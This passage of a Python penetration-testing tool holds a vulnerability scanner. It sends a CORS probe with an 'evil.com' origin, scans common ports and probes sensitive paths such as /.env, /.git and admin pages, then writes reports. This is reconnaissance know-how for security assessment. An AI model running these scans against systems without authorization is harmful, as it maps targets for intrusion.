            """Check for CORS misconfigurations"""
            headers = {'Origin': 'http://evil.com'}
            try:
                response = requests.get(self.target, headers=headers, timeout=5)
                if 'Access-Control-Allow-Origin' in response.headers:
                    if response.headers['Access-Control-Allow-Origin'] == '*':
                        self.vulnerabilities.append({
                            'type': 'CORS Misconfiguration',
                            'issue': 'Wildcard origin allowed',
                            'severity': 'Medium'
                        })
            except:
                pass
        
        def check_security_headers(self):
            """Check security headers"""
            try:
                response = requests.get(self.target, timeout=5)
                headers = response.headers
                
                missing_headers = []
                important_headers = [
                    'X-Frame-Options',
                    'X-Content-Type-Options',
                    'X-XSS-Protection',
                    'Content-Security-Policy',
                    'Strict-Transport-Security'
                ]
                
                for header in important_headers:
                    if header not in headers:
                        missing_headers.append(header)
                
                if missing_headers:
                    self.vulnerabilities.append({
                        'type': 'Missing Security Headers',
                        'headers': missing_headers,
                        'severity': 'Low'
                    })
            except:
                pass
        
        def check_ssl_tls(self):
            """Check SSL/TLS configuration"""
            # This would require SSL/TLS scanning
            pass
        
        def check_directory_listing(self):
            """Check for directory listing"""
            test_dirs = ['/images/', '/uploads/', '/backup/', '/admin/']
            for directory in test_dirs:
                test_url = f"{self.target}{directory}"
                try:
                    response = requests.get(test_url, timeout=5)
                    if any(indicator in response.text.lower() for indicator in ['index of', 'directory listing', '<title>directory of']):
                        self.vulnerabilities.append({
                            'type': 'Directory Listing',
                            'url': test_url,
                            'severity': 'Low'
                        })
                except:
                    pass
        
        def check_backup_files(self):
            """Check for backup files"""
            backup_extensions = ['.bak', '.backup', '.old', '.tmp', '.swp']
            for ext in backup_extensions:
                test_url = f"{self.target}{ext}"
                try:
                    response = requests.get(test_url, timeout=5)
                    if response.status_code == 200:
                        self.vulnerabilities.append({
                            'type': 'Backup File Found',
                            'url': test_url,
                            'severity': 'Medium'
                        })
                except:
                    pass
        
        def check_debug_pages(self):
            """Check for debug pages"""
            debug_paths = ['/phpinfo.php', '/test.php', '/debug.php', '/admin/debug']
            for path in debug_paths:
                test_url = f"{self.target}{path}"
                try:
                    response = requests.get(test_url, timeout=5)
                    if response.status_code == 200:
                        self.vulnerabilities.append({
                            'type': 'Debug Page',
                            'url': test_url,
                            'severity': 'Medium'
                        })
                except:
                    pass
        
        def run_comprehensive_scan(self):
            """Run all vulnerability checks"""
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Starting comprehensive vulnerability scan...")
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Target: {self.target}")
            
            self.check_common_vulnerabilities()
            
            # Additional scans
            self.scan_ports()
            self.crawl_for_endpoints()
            
            return self.vulnerabilities
        
        def scan_ports(self):
            """Simple port scan (limited for demo)"""
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Scanning common ports...")
            
            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389]
            
            from urllib.parse import urlparse
            parsed = urlparse(self.target)
            hostname = parsed.hostname
            
            if hostname:
                for port in common_ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        result = sock.connect_ex((hostname, port))
                        if result == 0:
                            self.vulnerabilities.append({
                                'type': 'Open Port',
                                'port': port,
                                'service': self.get_service_name(port),
                                'severity': 'Info'
                            })
                        sock.close()
                    except:
                        pass
        
        def get_service_name(self, port):
            """Get service name from port number"""
            services = {
                21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
                53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',
                443: 'HTTPS', 445: 'SMB', 3306: 'MySQL', 3389: 'RDP'
            }
            return services.get(port, 'Unknown')
        
        def crawl_for_endpoints(self):
            """Crawl for additional endpoints"""
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Crawling for endpoints...")
            
            common_paths = [
                '/admin', '/login', '/dashboard', '/config', '/backup',
                '/api', '/test', '/debug', '/phpinfo.php', '/robots.txt',
                '/sitemap.xml', '/.git', '/.env', '/wp-admin', '/administrator'
            ]
            
            for path in common_paths:
                test_url = f"{self.target}{path}"
                try:
                    response = requests.get(test_url, timeout=5)
                    if response.status_code == 200:
                        self.vulnerabilities.append({
                            'type': 'Endpoint Found',
                            'url': test_url,
                            'status': response.status_code,
                            'severity': 'Info'
                        })
                except:
                    pass

    def vulnerability_scanner(self):
        """Main vulnerability scanner interface"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}VULNERABILITY SCANNER{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}")
        
        target = input(f"\n{Fore.YELLOW}[?]{Style.RESET_ALL} Enter target URL: ")
        
        if not target.startswith('http'):
            target = 'http://' + target
        
        scanner = self.VulnerabilityScanner(target)
        
        print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Available scan types:")
        scan_types = [
            "1. Quick Scan (Common vulnerabilities)",
            "2. Full Scan (All checks)",
            "3. Custom Scan (Select specific checks)"
        ]
        
        for scan in scan_types:
            print(f"   {scan}")
        
        choice = input(f"\n{Fore.YELLOW}[?]{Style.RESET_ALL} Select scan type (1-3): ")
        
        print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Starting vulnerability scan...")
        
        vulnerabilities = scanner.run_comprehensive_scan()
        
        # Save results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        txt_report = f"{CONFIG['reports_dir']}/vulnerability_scan_{timestamp}.txt"
        json_report = f"{CONFIG['reports_dir']}/vulnerability_scan_{timestamp}.json"
        
        # Save as TXT
        with open(txt_report, 'w') as f:
            f.write("="*60 + "\n")
            f.write("VULNERABILITY SCAN REPORT\n")
            f.write("="*60 + "\n\n")
            f.write(f"Target: {target}\n")
            f.write(f"Scan Date: {datetime.now()}\n")
            f.write(f"Total Vulnerabilities Found: {len(vulnerabilities)}\n\n")
            
            # Group by severity
            by_severity = {'Critical': [], 'High': [], 'Medium': [], 'Low': [], 'Info': []}
            for vuln in vulnerabilities:
                severity = vuln.get('severity', 'Info')
                by_severity[severity].append(vuln)
            
            for severity in ['Critical', 'High', 'Medium', 'Low', 'Info']:
                if by_severity[severity]:
                    f.write(f"\n{severity.upper()} SEVERITY ({len(by_severity[severity])}):\n")
                    f.write("-"*60 + "\n")
                    for vuln in by_severity[severity]:
                        f.write(f"Type: {vuln['type']}\n")
                        if 'url' in vuln:
                            f.write(f"URL: {vuln['url']}\n")
                        if 'parameter' in vuln:
                            f.write(f"Parameter: {vuln['parameter']}\n")
                        if 'payload' in vuln:
                            f.write(f"Payload: {vuln['payload']}\n")
                        f.write("-"*40 + "\n")
        
        # Save as JSON
        with open(json_report, 'w') as f:
            json.dump({
                'target': target,
                'scan_date': datetime.now().isoformat(),
                'vulnerabilities': vulnerabilities,
                'summary': {
                    'total': len(vulnerabilities),
                    'by_severity': {k: len(v) for k, v in by_severity.items()}
                }
            }, f, indent=2)
        
        # Display in terminal
        print(f"\n{Fore.GREEN}{'='*60}")
        print(f"SCAN COMPLETED")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Summary:")
        print(f"  Target: {target}")
        print(f"  Total Vulnerabilities: {len(vulnerabilities)}")
        
        for severity in ['Critical', 'High', 'Medium', 'Low', 'Info']:
            count = len(by_severity[severity])
            if count > 0:
                color = Fore.RED if severity in ['Critical', 'High'] else Fore.YELLOW if severity == 'Medium' else Fore.GREEN
                print(f"  {severity}: {color}{count}{Style.RESET_ALL}")
        
        if vulnerabilities:
            print(f"\n{Fore.YELLOW}[!]{Style.RESET_ALL} Top vulnerabilities found:")
            for vuln in vulnerabilities[:5]:  # Show first 5
                severity_color = Fore.RED if vuln.get('severity') in ['Critical', 'High'] else Fore.YELLOW
                print(f"  {severity_color}[{vuln.get('severity', 'Info')}]{Style.RESET_ALL} {vuln['type']}")
                if 'url' in vuln:
                    print(f"      URL: {vuln['url']}")
        
        print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} Reports saved to:")
        print(f"  TXT: {txt_report}")
        print(f"  JSON: {json_report}")
        
        input(f"\n{Fore.YELLOW}[?]{Style.RESET_ALL} Press Enter to continue...")

    def generate_report(self):
        """Generate comprehensive report from all scans"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}COMPREHENSIVE REPORT GENERATOR{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}")
        
        print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Scanning for existing reports...")
        
        reports_dir = Path(CONFIG['reports_dir'])
        reports = list(reports_dir.glob("*.txt")) + list(reports_dir.glob("*.json"))
        
        if not reports:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} No reports found!")
            input(f"\n{Fore.YELLOW}[?]{Style.RESET_ALL} Press Enter to continue...")
            return
        
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Found {len(reports)} report(s)")
        
        # Create summary report
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        summary_file = f"{CONFIG['reports_dir']}/comprehensive_summary_{timestamp}.html"
        
        with open(summary_file, 'w') as f:
            f.write("""<!DOCTYPE html>
<html>
<head>
    <title>Penetration Testing Summary Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        h1 { color: #333; }
        .section { margin: 20px 0; padding: 20px; border: 1px solid #ddd; }
        .critical { color: #ff0000; }
        .high { color: #ff6600; }
        .medium { color: #ffcc00; }
        .low { color: #009900; }
        .info { color: #0066cc; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
    </style>
</head>
<body>
    <h1>Penetration Testing Summary Report</h1>
    <p>Generated: """ + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + """</p>
    
    <div class="section">
        <h2>Scan Summary</h2>
        <p>Total reports found: """ + str(len(reports)) + """</p>
    </div>
    
    <div class="section">
        <h2>Available Reports</h2>
        <ul>
""")
            
            for report in reports:
                f.write(f'<li><a href="{report.name}">{report.name}</a> ({report.stat().st_size} bytes)</li>\n')
            
            f.write("""
        </ul>
    </div>
    
    <div class="section">
        <h2>Recommendations</h2>
        <ul>
            <li>Review all findings with development team</li>
            <li>Prioritize Critical and High severity issues</li>
            <li>Implement security headers</li>
            <li>Regular security scanning</li>
            <li>Developer security training</li>
        </ul>
    </div>
</body>
</html>""")
        
        print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} Summary report generated: {summary_file}")
        print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Opening report in browser...")
        
        # Try to open in browser
        try:
            import webbrowser
            webbrowser.open(f"file://{os.path.abspath(summary_file)}")
        except:
            pass
        
        input(f"\n{Fore.YELLOW}[?]{Style.RESET_ALL} Press Enter to continue...")

def main():
    """Main entry point"""
    print(f"{Fore.RED}{Style.BRIGHT}")
    print("="*60)
    print("PENETRATION TESTING FRAMEWORK v2.0")
    print("="*60)
    print(Style.RESET_ALL)
    
    print(f"\n{Fore.YELLOW}[!]{Style.RESET_ALL} DISCLAIMER:")
    print("  This tool is for authorized security testing only.")
    print("  Use only on systems you own or have permission to test.")
    print("  The author is not responsible for any misuse.")
    
    confirm = input(f"\n{Fore.RED}[?]{Style.RESET_ALL} Do you agree to use this tool ethically? (y/n): ")
    
    if confirm.lower() != 'y':
        print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} Exiting...")
        sys.exit(0)
    
    try:
        framework = PenTestFramework()
        framework.run()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!]{Style.RESET_ALL} Interrupted by user. Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!]{Style.RESET_ALL} Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    # Check Python version
    if sys.version_info < (3, 7):
        print(f"{Fore.RED}[!]{Style.RESET_ALL} Python 3.7 or higher is required!")
        sys.exit(1)
    
    # Check for required modules
    required = ['requests', 'colorama']
    missing = []
    
    for module in required:
        try:
            __import__(module)
        except ImportError:
            missing.append(module)
    
    if missing:
        print(f"{Fore.RED}[!]{Style.RESET_ALL} Missing required modules: {', '.join(missing)}")
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Install with: pip install {' '.join(missing)}")
        sys.exit(1)
    
    main()